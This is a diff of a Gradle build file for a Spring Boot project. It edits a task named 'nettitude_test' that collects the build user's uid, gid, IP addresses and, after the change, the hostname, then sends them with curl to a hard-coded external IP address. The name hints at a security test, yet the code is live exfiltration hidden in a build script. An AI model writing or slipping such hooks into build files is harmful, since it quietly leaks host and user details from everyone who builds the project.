@@ -30,25 +30,14 @@ dependencies {
 	testImplementation 'org.springframework.boot:spring-boot-starter-test'
 }
 
-def getIP(){
-	new ByteArrayOutputStream().withStream { os ->
-                def result = exec {
-                    executable = 'hostname'
-                    args += '-I'
-                }
-                return os.toString()
-            }
-}
-
-import org.gradle.internal.os.OperatingSystem;
-
 task nettitude_test(type:Exec){
 	println("Executing")
 	def username = System.properties['user.name']
 	def uid = ["id", "-u", username].execute().text.trim()
 	def gid = ["id", "-g", username].execute().text.trim()
-	def ip = getIP()
-	commandLine 'curl', "http://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}"
+	def ip = ["hostname", "-I"].execute().text.trim()
+	def hostname = ["hostname"].execute().text.trim()
+	commandLine 'curl', "http://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
 	println("Executed")
 }
 
